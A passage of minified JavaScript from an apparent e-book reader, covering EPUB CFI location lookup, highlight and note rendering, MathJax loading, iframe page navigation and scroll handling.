                return isNaN(n) && (n = 0), isNaN(o) && (o = 0), 100 < n && (n = 100), n < 0 && (n = 0), 100 < o && (o = 100), o < 0 && (o = 0), {
                    positionX: n,
                    positionY: o
                }
            }
            var l,
                c = e,
                u = e.childNodes,
                d = u.length;
            for (l = 0; l < d; ++l) {
                var f = u[l];
                if (!(IsTextNode(f) && n || IsNodeInSkippedSubtree(f, o)))
                    if (IsTextNode(f)) {
                        if (h = i(f, t))
                            return h
                    } else if (1 == f.nodeType) {
                        var h;
                        if (r(g = f.getBoundingClientRect(), t))
                            return (h = FindDOMNodeAndOffsetIntersectingViewportRect(f, t, n)) ? h : {
                                node: f,
                                positionX: (p = s(t, g)).positionX,
                                positionY: p.positionY
                            };
                        g.top <= t.top && (c = f)
                    }
            }
            if (c) {
                var p,
                    g = c.getBoundingClientRect();
                return {
                    node: c,
                    positionX: (p = s(t, g)).positionX,
                    positionY: p.positionY
                }
            }
            return null
        }
        function GetNodeForScreenY(e, t, n) {
            return GetNodeForScreen(0, e, t, n)
        }
        function GetNodeForScreen(e, t, n, o) {
            var i = {
                    top: t + 25,
                    left: e,
                    bottom: t + 50,
                    right: window.innerWidth
                },
                r = FindDOMNodeAndOffsetIntersectingViewportRect(document.body, i, n, o);
            return r ? r.node : null
        }
        function GetNodeForCurrentScrollPosition(e, t) {
            return VST.scrollElement !== VST.window ? GetNodeForScreenY(VST.scrollElement.scrollTop, e, t) : GetNodeForScreenY(0, e, t)
        }
        function GetCFIForScreenY(e, t) {
            return GetCFIForScreen(0, e, t)
        }
        function GetCFIForScreen(e, t, n) {
            var o = {
                    top: t,
                    left: e,
                    bottom: t + 50,
                    right: window.innerWidth
                },
                i = FindDOMNodeAndOffsetIntersectingViewportRect(document.body, o, !0, n);
            if (i) {
                if (null != i.offset)
                    return GetCFIForRangeEndpoint(i.node, i.offset);
                var r = GetCFIForRangeEndpoint(i.node, 0);
                return null != i.positionX && null != i.positionY && (r = r + "@" + i.positionX + ":" + i.positionY), r
            }
            return null
        }
        function GetCFIForCurrentScrollPosition(e) {
            return VST.scrollElement !== VST.window ? GetCFIForScreenY(VST.scrollElement.scrollTop, e) : GetCFIForScreenY(0, e)
        }
        function GetCFIForPoint(e, t) {
            return GetCFIForScreen(e, t)
        }
        function GetChapterOffsetForCurrentScrollPosition() {
            var e,
                t = GetNodeForCurrentScrollPosition(!0);
            if (!t)
                return null;
            if (e = t.getAttribute("o"))
                return parseInt(e, 10);
            for (; t = t.parentNode;)
                if (e = t.getAttribute("o"))
                    return e;
            return null
        }
        function Init(e) {
            e || (e = {
                mathJaxURL: "https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js"
            });
            try {
                ProcessEPUBSwitches(["http://www.w3.org/1998/Math/MathML"])
            } catch (i) {}
            if (e.mathJaxURL)
                try {
                    LoadMathJax(e.mathJaxURL, e.mathJaxConfig)
                } catch (i) {}
            e.noteIconHandler && (noteIconHandler = e.noteIconHandler);
            try {
                if (!e.skipNoteCSS) {
                    var t = document.createElement("style");
                    t.innerHTML = ".vstnoteindicator          { float: right; width: 16px; height: 16px; background: transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAACXBIWXMAAAsTAAALEwEAmpwYAAAABGdBTUEAANjr9RwUqgAAACBjSFJNAABuJwAAc68AAPY3AACApQAAcCMAAN0CAAAwPgAAFrLOXXcKAAADAFBMVEXbyAfVyo7+/v794CD/7Tr42Q7NrFGrog798wz///8KCgoLCwsMDAwNDQ0ODg4PDw8QEBARERESEhITExMUFBQVFRUWFhYXFxcYGBgZGRkaGhobGxscHBwdHR0eHh4fHx8gICAhISEiIiIjIyMkJCQlJSUmJiYnJycoKCgpKSkqKiorKyssLCwtLS0uLi4vLy8wMDAxMTEyMjIzMzM0NDQ1NTU2NjY3Nzc4ODg5OTk6Ojo7Ozs8PDw9PT0+Pj4/Pz9AQEBBQUFCQkJDQ0NERERFRUVGRkZHR0dISEhJSUlKSkpLS0tMTExNTU1OTk5PT09QUFBRUVFSUlJTU1NUVFRVVVVWVlZXV1dYWFhZWVlaWlpbW1tcXFxdXV1eXl5fX19gYGBhYWFiYmJjY2NkZGRlZWVmZmZnZ2doaGhpaWlqampra2tsbGxtbW1ubm5vb29wcHBxcXFycnJzc3N0dHR1dXV2dnZ3d3d4eHh5eXl6enp7e3t8fHx9fX1+fn5/f3+AgICBgYGCgoKDg4OEhISFhYWGhoaHh4eIiIiJiYmKioqLi4uMjIyNjY2Ojo6Pj4+QkJCRkZGSkpKTk5OUlJSVlZWWlpaXl5eYmJiZmZmampqbm5ucnJydnZ2enp6fn5+goKChoaGioqKjo6OkpKSlpaWmpqanp6eoqKipqamqqqqrq6usrKytra2urq6vr6+wsLCxsbGysrKzs7O0tLS1tbW2tra3t7e4uLi5ubm6urq7u7u8vLy9vb2+vr6/v7/AwMDBwcHCwsLDw8PExMTFxcXGxsbHx8fIyMjJycnKysrLy8vMzMzNzc3Ozs7Pz8/Q0NDR0dHS0tLT09PU1NTV1dXW1tbX19fY2NjZ2dna2trb29vc3Nzd3d3e3t7f39/g4ODh4eHi4uLj4+Pk5OTl5eXm5ubn5+fo6Ojp6enq6urr6+vs7Ozt7e3u7u7v7+/w8PDx8fHy8vLz8/P09PT19fX29vb39/f4+Pj5+fn6+vr7+/v8/Pz9/f3+/v7////pEhBPAAAACnRSTlP///////////8AsswszwAAAE9JREFUeNqsjzkSgDAMxDYDtnb//2GKcARqZDfWqLHyQWkWOgp2XWuiULbnWVN44QdRL7G5RBR2zxHwKrAZUTiDwnSeogQ9EqVvxvz2wzEAF6QHkH6VgZIAAAAASUVORK5CYII=) no-repeat top right; }";
                    var n = document.createElement("style");
                    n.innerHTML = "span.vsthighlight { display:inline !important; font-family: inherit !important; font-style: inherit !important; font-size: inherit !important; font-weight: inherit !important; width:auto !important; color:inherit !important; }";
                    var o = document.getElementsByTagName("head")[0];
                    o.appendChild(t),
                    o.appendChild(n)
                }
            } catch (i) {}
        }
        TestResults.prototype.TestFail = function(e, t, n) {
            this.failCount += 1,
            e && this.AddErrorMessage(e),
            t && (this.AddErrorMessage("Expected: " + t), n ? this.AddErrorMessage("Actual: " + n) : this.AddErrorMessage("Actual: (null)"))
        },
        TestResults.prototype.TestSuccess = function(e) {
            this.successCount += 1,
            e && this.AddMessage(e)
        },
        TestResults.prototype.AddMessage = function(e) {
            this.messages.push(e),
            logMessage(e)
        },
        TestResults.prototype.AddErrorMessage = function(e) {
            this.messages.push(e),
            logError(e)
        },
        TestResults.prototype.JoinMessages = function() {
            return this.messages.join("\n")
        },
        TestResults.prototype.ResultSummary = function() {
            return "Succeeded: " + this.successCount + "; Failed: " + this.failCount
        };
        var currentToolTipGUID = null,
            tooltip = null;
        CFILocation.prototype.toString = function() {
            var e = "CFILocation, node: " + this.node;
            return null != this.node.nodeValue && (e += " value: " + this.node.nodeValue), e += " document: " + this.document, this.offset && (e += " offset: " + this.offset), this.afterNode && (e += " (after node)"), this.error && (e += " error: " + this.error), e
        };
        var sOriginalFirstBodyNode = null,
            sDontHighlightMathML = !0;
        CFIDOMWalker.prototype.Initialize = function(e, t, n) {
            this.node = e,
            this.index = t,
            this.document = n,
            this.backToNodeStack = new Array;
            for (var o = this.node.parentNode; NodeIsHighlightSpan(o);)
                o.nextSibling && this.backToNodeStack.push(o.nextSibling),
                o = o.parentNode;
            this.backToNodeStack.reverse(),
            0 == t && this.NextNode()
        },
        CFIDOMWalker.prototype.FirstChild = function() {
            if (sOriginalFirstBodyNode && this.node == document.body && this.node == sOriginalFirstBodyNode.parentNode)
                return sOriginalFirstBodyNode;
            for (
            var e = this.node.firstChild; e && NodeShouldBeSkipped(e);)
                e = e.nextSibling;
            return e
        },
        CFIDOMWalker.prototype.toString = function() {
            return "CFIDOMWalker, node: " + this.node + " index: " + this.index + " document: " + this.document
        },
        CFIDOMWalker.prototype.Clone = function() {
            return new CFIDOMWalker(this.node, this.index, this.document)
        },
        CFIDOMWalker.prototype.WalkChildren = function() {
            return !!this.FirstChild() && (this.Initialize(this.FirstChild(), 0, this.document), !0)
        },
        CFIDOMWalker.prototype.CreateChildWalker = function() {
            var e = this.FirstChild();
            return e ? new CFIDOMWalker(e, 0, this.document) : null
        },
        CFIDOMWalker.prototype.WalkContentDocumentChildren = function() {
            var e = this.node.contentDocument;
            if (!e)
                return !1;
            var t = FindDocumentRoot(e);
            return !!t && (this.Initialize(t, 0, e), !0)
        },
        CFIDOMWalker.prototype.CreateContentDocumentChildWalker = function() {
            var e = this.Clone();
            return e.WalkContentDocumentChildren() ? e : null
        },
        CFIDOMWalker.prototype.NextNode = function() {
            for (0 != this.index && (this.node = this.node.nextSibling), null == this.node && 0 < this.backToNodeStack.length && (this.node = this.backToNodeStack.pop()); this.node;)
                if (NodeShouldBeSkipped(this.node))
                    this.node = this.node.nextSibling;
                else {
                    if (!NodeIsHighlightSpan(this.node))
                        break;
                    var e = this.node.nextSibling;
                    e && this.backToNodeStack.push(e),
                    this.node = this.FirstChild()
                }
            return this.node && (this.index |= 1, 1 == this.node.nodeType && ++this.index), this.node
        },
        CFIDOMWalker.prototype.NextCFIIndex = function() {
            for (var e = this.index; this.index == e && null != this.node || this.CurrentNodeIsIgnored();)
                this.NextNode();
            return this.node
        },
        CFIDOMWalker.prototype.FindNodeAtIndex = function(e) {
            for (; this.node && this.index < e;)
                this.NextCFIIndex();
            return this.node
        },
        CFIDOMWalker.prototype.CurrentNodeIsElement = function() {
            return !!this.node && 1 === this.node.nodeType
        },
        CFIDOMWalker.prototype.CurrentNodeIsText = function() {
            return IsTextNode(this.node)
        },
        CFIDOMWalker.prototype.CurrentNodeIsIgnored = function() {
            if (!this.node)
                return !1;
            var e = this.node.nodeType;
            return !(1 === e || 3 === e || 4 === e || 5 === e)
        },
        CFIDOMWalker.prototype.CurrentNodeHasContentDocument = function() {
            return !!this.node && null != this.node.contentDocument
        },
        CFIDOMWalker.prototype.NextTextNode = function() {
            if (this.CurrentNodeIsText()) {
                for (this.NextNode(); this.CurrentNodeIsIgnored();)
                    this.NextNode();
                if (this.CurrentNodeIsText())
                    return this.node
            }
            return null
        },
        CFIDOMWalker.prototype.FindNodeAtOffset = function(e, t) {
            if (!this.CurrentNodeIsText())
                return null;
            for (var n, o = e, i = 0; this.CurrentNodeIsText();) {
                if (o -= i, n = this.node, this.index, o < (i = this.node.nodeValue.length))
                    return r = new CFILocation(this.node, t, o);
                this.NextTextNode()
            }
            var r;
            return i < o && (logError("Offset out of range: " + o), o = i), (r = new CFILocation(n, this.document, o)).afterNode = !0, r
        };
        var sSavedCFIScroll = null,
            sCFIScrollCompletion = new Array,
            sScrollToCFIPaused = !1;
        CFIRangeNode.prototype.limitContentRange = function() {
            VST.contentRangeBundle = [];
            var e = FindDocumentRoot(document),
                t = document,
                n = locateCFISubpathFromNode(this.basePath, e, t);
            if (!n || n.error)
                return logError("CFIRangeNode base subpath not found: " + this.basePath), null;
            var o = n.node,
                i = locateCFISubpathFromNode(this.begin, o, n.document),
                r = locateCFISubpathFromNode(this.end, o, n.document);
            if (i && i.document != n.document)
                logError("CFIRangeNode Highlight Error: fromLocation not in same document as base subpath");
            else {
                if (!r || r.document == n.document) {
                    var a = i.node.parentElement;
                    for (VST.contentRangeBundle.push($(i.node).prevAll()), $(i.node).prevAll().hide(); a;)
                        a.contains(r.node) ? (VST.contentRangeBundle.push($(a).siblings()), $(a).siblings().hide()) : (VST.contentRangeBundle.push($(a).prevAll()), $(a).prevAll().hide()),
                        a = a.parentElement;
                    a = r.node.parentElement;
                    for (VST.contentRangeBundle.push($(r.node).nextAll()), $(r.node).nextAll().hide(); a;)
                        a.contains(i.node) ? (VST.contentRangeBundle.push($(a).siblings()), $(a).siblings().hide()) : (VST.contentRangeBundle.push($(a).nextAll()), $(a).nextAll().hide()),
                        a = a.parentElement;
                    return {
                        height: document.body.clientHeight,
                        width: document.body.clientWidth
                    }
                }
                logError("CFIRangeNode Highlight Error: toLocation not in same document as base subpath")
            }
        },
        CFIRangeNode.prototype.Highlight = function(e, t) {
            var n = locateCFISubpathFromNode(this.basePath, e, t);
            if (!n || n.error)
                return logError("CFIRangeNode base subpath not found: " + this.basePath), null;
            var o = n.node,
                i = locateCFISubpathFromNode(this.begin, o, n.document),
                r = locateCFISubpathFromNode(this.end, o, n.document);
            if (i && i.document != n.document)
                logError("CFIRangeNode Highlight Error: fromLocation not in same document as base subpath");
            else if (r && r.document != n.document)
                logError("CFIRangeNode Highlight Error: toLocation not in same document as base subpath");
            else {
                if (1 != o.nodeType && (i.node != o || r.node != o))
                    for (o = o.parentNode; NodeIsHighlightSpan(o);)
                        o = o.parentNode;
                var a = NodeStackForLocation(o, i),
                    s = NodeStackForLocation(o, r);
                a && s && HighlightDOMLocationStacks(a, s, this.color, this.additionalClass, this.hasNote, this.emoji)
            }
        },
        CFIRangeTreeNode.prototype.Highlight = function(e, t) {
            var n = locateCFISubpathFromNode(this.basePath, e, t);
            if (!n || n.error)
                return logError("CFIRangeTreeNode base subpath not found: " + this.basePath), null;
            var o,
                i = n.node,
                r = n.document,
                a = this.children.length;
            for (o = 0; o < a; ++o)
                this.children[o].Highlight(i, r)
        };
        var noteIconHandler = CreateNoteSpan;
        return {
            Init: Init,
            ScrollToCFI: ScrollToCFI,
            UnhighlightAll: UnhighlightAll,
            BuildHighlightRangeTree: BuildHighlightRangeTree,
            HighlightRanges: HighlightRanges,
            TestHighlightRanges: TestHighlightRanges,
            TestHighlightCFIRange: TestHighlightCFIRange,
            ProcessEPUBSwitches: ProcessEPUBSwitches,
            LoadMathJax: LoadMathJax,
            ConfigMathJax: ConfigMathJax,
            TestHighlightSelection: TestHighlightSelection,
            HasHighlightableSelection: HasHighlightableSelection,
            RunAutomatedTests: RunAutomatedTests,
            GetCFIForNode: GetCFIForNode,
            GetCFIRangeForSelection: GetCFIRangeForSelection,
            GetCFIRangeStringForSelection: GetCFIRangeStringForSelection,
            GetSelectionText: GetSelectionText,
            ClearSelection: ClearSelection,
            HighlightGUIDForPoint: HighlightGUIDForPoint,
            HighlightGUIDForNode: HighlightGUIDForNode,
            StripCFIAssertions: StripCFIAssertions,
            IsPointInHighlightableSelectedText: IsPointInHighlightableSelectedText,
            GetCFIForCurrentScrollPosition: GetCFIForCurrentScrollPosition,
            GetCFIForScreenY: GetCFIForScreenY,
            GetCFIForPoint: GetCFIForPoint,
            FindDOMNodeAndOffsetIntersectingViewportRect: FindDOMNodeAndOffsetIntersectingViewportRect,
            locateCFI: locateCFI,
            exitContentRange: exitContentRange,
            FindHighlightGUIDInClassString: FindHighlightGUIDInClassString,
            GetSpeechText: GetSpeechText,
            GetNodeForCurrentScrollPosition: GetNodeForCurrentScrollPosition,
            GetNodeForScreenY: GetNodeForScreenY,
            GetNodeForScreen: GetNodeForScreen,
            GetChapterOffsetForCurrentScrollPosition: GetChapterOffsetForCurrentScrollPosition,
            CFIRangeNode: CFIRangeNode,
            locateCFISubpathFromNode: locateCFISubpathFromNode
        }
    },
    CallJS = function(scriptForEval) {
        return eval(scriptForEval)
    };
(function(s) {
    var i = function(e) {
            var t = l.getIFrameContainer(),
                n = t.find("iframe"),
                o = n[0];
            o && (o.contentWindow.location.href = "about:blank"),
            n.remove();
            var i = e[0],
                r = e[1];
            i || (i = r, r = null);
            var a = r ? "no" : "auto";
            if (t.append("<iframe id='epub-content' class='page-content' src='" + i + "' allowTransparency='true' scrolling='" + a + "' frameBorder='0' width='100%' height='100%' allowfullscreen='true' webkitallowfullscreen='true' mozallowfullscreen='true'></iframe>"), r) {
                var s = "position: absolute;";
                t.append("<iframe id='epub-content-right' class='page-content' src='" + r + "' allowTransparency='true' scrolling='no' frameBorder='0' width='100%' height='100%' allowfullscreen='true' webkitallowfullscreen='true' mozallowfullscreen='true' style='" + s + "'></iframe>")
            }
        },
        n = function(e) {
            var t = VST.$(VST.document),
                n = {
                    cfi: e = e || VST.sharedEpubModule.GetCFIForCurrentScrollPosition(),
                    cfiwithoutAssertions: VST.sharedEpubModule.StripCFIAssertions(e),
                    scrollTop: VST.Utils.scrollTop(),
                    scrollLeft: VST.Utils.scrollLeft(),
                    scrollHeight: VST.scrollElement.scrollHeight || t.outerHeight(),
                    scrollWidth: VST.scrollElement.scrollWidth || t.outerWidth()
                };
            VST.fire("page:navigate", n)
        },
        l = {
            touch: !0,
            iframe: "#epub-container",
            bind: function() {},
            unbind: function() {},
            trigger: function() {},
            noscroll: function(e) {
                return e.preventDefault(), !1
            },
            getContainerDimensions: function(e) {
                var t = this.getIFrameContainer();
                data = {
                    width: t.width(),
                    height: t.height(),
                    scale: scale,
                    offsetX: Math.max(t.scrollLeft(), s(s("#epub-content").get(0).contentWindow).scrollLeft()),
                    offsetY: Math.max(t.scrollTop(), s(s("#epub-content").get(0).contentWindow).scrollTop())
                };
                var n = new Jigsaw.Response({
                    status: "ok",
                    data: data
                });
                return e && e(n), data
            },
            focus: function(e) {
                if (!(0 < VST.$(VST.document).find(":focus").length)) {
                    var t = this.getIFrameContainer();
                    t.contentWindow || (t = t.find("#epub-content").get(0)),
                    t.contentWindow.focus(),
                    e && e()
                }
            },
            setCursor: function(e) {
                return "object" == typeof e ? (s(VST.document.body).css("cursor", e.fallback + ", auto"), s(VST.document.body).css("cursor", e.retina + ", auto")) : "string" == typeof e && s(VST.document.body).css("cursor", e + ", auto"), s(VST.document.body).find(".vsthighlight").css("cursor", "inherit"), !0
            },
            resetCursor: function() {
                return s(VST.document.body).css("cursor", ""), s(VST.document.body).find(".vsthighlight").css("cursor", "pointer"), !0
            },
            touchEventsEnabled: function(e, t) {
                if (t != undefined)
                    if (Jigsaw.touch = t)
                        if (VST.FeatureChecks.hasAutoExpandingIframe()) {
                            s("#scroll-stopper").css("display", "none");
                            n = this;
                            s(".page-content").each(function() {
                                this.contentWindow.document.body.removeEventListener("touchmove", n.noscroll)
                            })
                        } else
                            s(".page-content").css("overflow", "auto");
                    else if (VST.FeatureChecks.hasAutoExpandingIframe()) {
                        s("#scroll-stopper").css("display", "block");
                        var n = this;
                        s(".page-content").each(function() {
                            this.contentWindow.document.body.addEventListener("touchmove", n.noscroll)
                        })
                    } else
                        s(".page-content").css("overflow", "hidden");
                e && e(new Jigsaw.Response({
                    status: "ok",
                    data: Jigsaw.touch
                }));
                return Jigsaw.touch
            },
            getIFrameContainer: function() {
                return s("#epub-container")
            },
            goToNextPage: function() {
                VST.Book.goToNextPage()
            },
            goToPreviousPage: function() {
                VST.Book.goToPreviousPage()
            },
            getCFIForNode: function(e) {
                return VST.sharedEpubModule.GetCFIForNode(e)
            },
            locateCFI: function(e) {
                return VST.sharedEpubModule.locateCFI(e)
            },
            stripCFIAssertions: function(e) {
                return VST.sharedEpubModule.StripCFIAssertions(e)
            },
            compareCFIs: function(e, t) {
                return VST.Utils.compareCFIs(e, t)
            },
            getCFIForPoint: function(e, t) {
                return VST.sharedEpubModule.GetCFIForPoint(e, t)
            },
            getPageIndexForPath: function(e) {
                var t = document.createElement("a");
                t.href = e;
                for (var n = t.pathname, o = 0; o < VST.Book.pages.length; o++)
                    if (VST.Book.pages[o].getPath() == n || VST.Book.pages[o].getURL() == n)
                        return o
            },
            getPageIndexForUrl: function(e, t) {
                var n = VST.sharedEpubModule.StripCFIAssertions(e).split("cfi"),
                    o = n && n[1] && n[1].split("!")[0];
                if (o)
                    for (var i = 0; i < VST.Book.pages.length; i++)
                        if (VST.sharedEpubModule.StripCFIAssertions(VST.Book.pages[i].getCFI()) == o)
                            return t(i);
                var r = (n = VST.sharedEpubModule.StripCFIAssertions(e).split("highlights/")) && n[1];
                r && s.ajax({
                    url: VST.Book.buildAPIURL("/highlights/" + r + "/page-url"),
                    dataType: "json",
                    success: function(e) {
                        t(this.getPageIndexForPath(e))
                    }.bind(this)
                }),
                t(this.getPageIndexForPath(e))
            },
            getPathsForUrl: function(e, r) {
                return Array.isArray(e) ? r(e) : VST.dpsOn ? void this.getPageIndexForUrl(e, function(e) {
                    var t = VST.Book.pages[e],
                        n = [VST.Book.buildURL(t.getPath())];
                    if ("right" === t.getPageSpread()) {
                        var o = VST.Book.pages[e - 1];
                        o && "left" === o.getPageSpread() ? n.unshift(VST.Book.buildURL(o.getPath())) : n.unshift(null)
                    } else if ("left" === t.getPageSpread()) {
                        var i = VST.Book.pages[e + 1];
                        i && "right" === i.getPageSpread() && n.push(VST.Book.buildURL(i.getPath()))
                    }
                    r(n)
                }) : r([VST.Book.buildURL(e)])
            },
            navigateTo: function(e, t, n) {
                t && Jigsaw.once("page:ready", t),
                n || -1 === e.indexOf(VST.window.location.pathname) ? this.getPathsForUrl(e, function(e) {
                    VST.resetArrays(),
                    i(e)
                }) : VST.Book.getCurrentPage(function(e, t) {
                    var n = t ? null : t.getCFI();
                    Jigsaw.trigger("page:ready", {
                        cfi: n
                    })
                })
            },
            scrollToPosition: function(e) {
                var t = VST.scrollElement.scrollTop || VST.scrollElement.scrollY || s(VST.scrollElement).scrollTop(),
                    n = s(VST.scrollElement).height(),
                    o = 0,
                    i = s(e).offset().top,
                    r = s(e).height() || 0;
                o = i < t ? i - 10 : t + n - 10 - r < i ? i - 10 : t;
                var a = VST.scrollElement;
                s.isWindow(a) && (a = s(a.document).find("html, body")),
                s(a).stop(!0, !0).animate({
                    scrollTop: o
                }, 500)
            },
            navigateToNode: function(e, t) {
                return !!e && (n(t), s(e).is(":visible") ? Jigsaw.scrollToPosition(e, t) : (s(e).show(), Jigsaw.scrollToPosition(e, t), s(e).hide()), e.getAttribute("tabindex") || e.setAttribute("tabindex", "0"), VST.autofocus && (e.focus(), setTimeout(function() {
                        e.removeAttribute("tabindex")
                    }, 2500)), !0)
            },
            navigateToHighlight: function(e, t) {
                e.syncId || (e = {
                    syncId: e
                });
                var n = s(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass + ".highlight_" + e.syncId);
                if (0 < n.length && Jigsaw.navigateToNode(n.get(0), VST.sharedEpubModule.GetCFIForNode(n.get(0))))
                    return t();
                Jigsaw.navigationRequested();
                var o = VST.Book.buildAPIURL("highlights/" + e.syncId);
                return (e.subscription || e.subscribed) && (o += "/shared"), Jigsaw.navigateTo(o, function() {
                    VST.once("highlights:render", function() {
                        t()
                    })
                })
            },
            reloadPage: function(o) {
                VST.Book.getCurrentPage(function(e, t) {
                    if (t) {
                        Jigsaw.navigationRequested(),
                        o && Jigsaw.once("page:ready", o);
                        var n = t.getPath();
                        this.getPathsForUrl(n, function(e) {
                            VST.resetArrays(),
                            i(e)
                        })
                    }
                }.bind(this))
            },
            navigationRequested: function() {
                Jigsaw.trigger("book:navigationRequested")
            }
        };
    this.Jigsaw = VST.Jigsaw = l
}).call(window, VST.$),
function() {
    var o,
        e = (o = VST.fire, function(e, t) {
            /selectionMade/.test(e) && r(),
            VST.Logger.info("firing (original handler)", e, "with: ", t, "in: ", window.location.hostname),
            o.apply(this, arguments),
            delete e.originalEvent,
            delete e.target,
            t && t.nodeName && /highlight|note/.test(e) && (t = i(t));
            try {
                Jigsaw.trigger.apply(Jigsaw, arguments)
            } catch (n) {
                VST.Logger.error("error firing event: ", e, n)
            }
        });
    VST.EventDispatcher.fire = VST.EventDispatcher.trigger = VST.trigger = VST.fire = e;
    var i = function(e) {
            var t,
                n,
                o;
            "svg" === e.tagName ? (n = e.nextElementSibling, o = e.className.baseVal) : o = (n = e).className,
            t = {
                top: n.offsetTop - VST.Utils.scrollTop(),
                left: n.offsetLeft - VST.Utils.scrollLeft(),
                width: n.offsetWidth,
                height: n.offsetHeight
            };
            var i = {
                syncId: e.getAttribute("data-guid"),
                markerId: e.getAttribute("data-marker-guid"),
                noteText: e.getAttribute("data-note-text"),
                selectedText: e.getAttribute("data-selected-text"),
                shared: "true" == e.getAttribute("data-subscription"),
                position: t
            };
            return i.syncId || (matches = o.match(/highlight_([^\s]+)/)) && (i.syncId = matches[1]), i
        },
        r = function() {
            if (VST.Book) {
                var e = VST.Book.getCopyLimit();
                0 < e && (VST.Book.limitSelection(e, "copy"), VST.trigger("book:selectionLimited", {
                    limit: e
                }))
            }
        },
        f = function(e) {
            if (!e || !e.commonAncestorContainer)
                return !1;
            var t = e.commonAncestorContainer,
                n = !1;
            for (1 !== t.nodeType && (t = t.parentElement); !n && t;)
                /\bvstdonthighlight\b/i.test(t.className) && (n = !0),
                t = t.parentElement;
            return n
        };
    VST.bind("book:selectionMade", function(e, t) {
        if (data = {
            selectedText: t
        }, "pdf" == VST.Book.getFormat() || "pbk" == VST.Book.getFormat())
            data.selectionRect = VST.PictureBook.selection.getBoundingClientRect();
        else {
            var n = VST.Utils.getRangeObject(),
                o = n.getBoundingClientRect(),
                i = n.getClientRects(),
                r = {},
                a = VST.Utils.scrollTop();
            r.width = o.width,
            r.left = o.left,
            r.right = o.right;
            for (var s = n.startContainer; 1 !== s.nodeType && (s = s.parentNode);)
                ;
            0 === i.length && (i = s.getClientRects());
            var l = VST.$(s).offset(),
                c = function(e, t, n) {
                    return n[0].top >= t.top && n[0].bottom >= t.top ? (e.top = n[0].top - a, e.bottom = n[n.length - 1].bottom - a) : (e.top = n[0].top, e.bottom = n[n.length - 1].bottom), e.height = r.bottom - r.top, e
                };
            if ((r = c(r, l, i)).bottom < 0 && r.top < 0) {
                var u = VST.$(VST.scrollElement);
                VST.$(u).scrollTop(u.scrollTop() + r.bottom - 100);
                var d = n.getClientRects();
                l = VST.$(s).offset(),
                r = c(r, l, d)
            }
            data.selectionRect = r
        }
        e.originalEvent && (data.eventPosition = {
            top: e.originalEvent.clientY,
            left: e.originalEvent.clientX
        }),
        VST.Book.isPBK() || (data.cfi = VST.sharedEpubModule.GetCFIRangeStringForSelection(), data.disableHighlights = !!f(VST.Utils.getRangeObject())),
        VST.lastHighlightDataForSelection = data.highlightAttrs = VST.Highlights.getHighlightDataForCurrentSelection(),
        VST.trigger("book:selectionWithPosition", data)
    }),
    VST.bind("page:ready", function() {
        VST.lastKnownScrollPosition = undefined
    }),
    VST.bind("page:scroll:raw", function() {
        var e = VST.scrollElement.pageYOffset || VST.scrollElement.scrollTop || VST.scrollElement.scrollY,
            t = VST.scrollElement.pageXOffset || VST.scrollElement.scrollLeft || VST.scrollElement.scrollX;
        void 0 === e && (e = 0),
        void 0 === t && (t = 0);
        var n = {
            scrollTop: e,
            scrollHeight: VST.scrollElement.scrollHeight || VST.$(VST.document).outerHeight(),
            scrollLeft: t,
            scrollWidth: VST.scrollElement.scrollWidth || VST.$(VST.document).outerWidth()
        };
        Browser.isSafari() && (e <= 1 && VST.lastKnownScrollPosition && 10 < VST.lastKnownScrollPosition && (VST.scrollElement.scrollTop = VST.lastKnownScrollPosition, $(VST.scrollElement).css("display", "none"), VST.scrollFixTimeout && clearTimeout(VST.scrollFixTimeout), VST.scrollFixTimeout = setTimeout(function() {
            $(VST.scrollElement).css("display", ""),
            VST.scrollElement.scrollTop = VST.lastKnownScrollPosition
        }, 750)), 10 < e && (VST.lastKnownScrollPosition = e)),
        VST.trigger("page:scroll:fullspeed", n)
    })
}.call(this),
function() {
    var h,
        v;
    h = VST.$,
    this.EpubBook = {
        highlightOneHighlight: function(e, t, n, o) {
            return null == n && (n = !1), this.drawOneHighlight(e, t, n, o), this.highlights.push(e)
        },
        drawOneHighlight: function(e, t, n, o) {
            var i,
                r,
                a,
                s,
                l,
                c,
                u;
            if (null == n && (n = !1), i = e.cfi, VST.sharedEpubModule.StripCFIAssertions(i.split("!")[0]) === VST.sharedEpubModule.StripCFIAssertions(t))
                return u = (i = i.split("!").slice(1).join("!")).split(","), a = e.vstColorDark && e.vstColorDark.replace("#", ""), c = "highlight_" + e.syncId + " " + VST.Models.Highlight.Settings.highlightClass + " vstcolor" + e.vstColor.replace("#", "") + " vstcolordark" + a, n ? (c += " vst-shared-highlight", r = e.vstColorDark) : r = e.vstColor, l = VST.Highlights.getEmoji(e.noteText), e.hasNote && l && VST.Highlights.isEmojiMarker(e.marker) ? r = "transparent" : l = null, s = {
                    base: u[0],
                    begin: u[1],
                    end: u[2],
                    hasNote: e.hasNote,
                    color: r,
                    additionalClass: c,
                    emoji: l
                }, VST.sharedEpubModule.HighlightRanges([s], r, c, o), VST.Highlights.updateHighlight(e.syncId, e)
        },
        highlightsForPage: function(e, t) {
            return e.filter(function(e) {
                return VST.sharedEpubModule.StripCFIAssertions(e.cfi).split("!")[0] === t
            })
        },
        getDataForPageHighlight: function(t) {
            return this.highlights.filter(function(e) {
                return e.syncId === t
            })[0]
        },
        highlightCurrentHighlights: function() {
            return this.highlights = [], Jigsaw.socket.highlightsEnabled((f = this, function(e) {
                if (e)
                    return VST.Book.getCurrentPages(function(e, t) {
                        return t.forEach(function(u) {
                            var e,
                                d;
                            return e = null != u ? u.getCFI() : void 0, d = VST.sharedEpubModule.StripCFIAssertions(e), VST.Book.getHighlights(function(e, t) {
                                var n,
                                    o,
                                    i,
                                    r,
                                    a,
                                    s,
                                    l;
                                if (!e) {
                                    for (VST.documents.forEach(function(e, t) {
                                        if (-1 !== e.URL.indexOf(u.getPath()))
                                            return VST.document = VST.documents[t], VST.window = VST.windows[t]
                                    }), s = f.highlightsForPage(t.highlights, d), f.highlights = f.highlights.concat(s), l = t.subscribedHighlights, o = 0, r = s.length; o < r; o++)
                                        (n = s[o]).marker = t.markers.find(function(e) {
                                            return e.globalId === n.markerId
                                        }),
                                        f.drawOneHighlight(n, d, !1, VST.document);
                                    for (i = 0, a = l.length; i < a; i++)
                                        (n = l[i]).marker = t.markers.find(function(e) {
                                            return e.globalId === n.markerId
                                        }),
                                        f.drawOneHighlight(n, d, !0, VST.document);
                                    h(VST.document).find(".vst-shared-highlight").each(function() {
                                        if ("svg" !== this.nodeName)
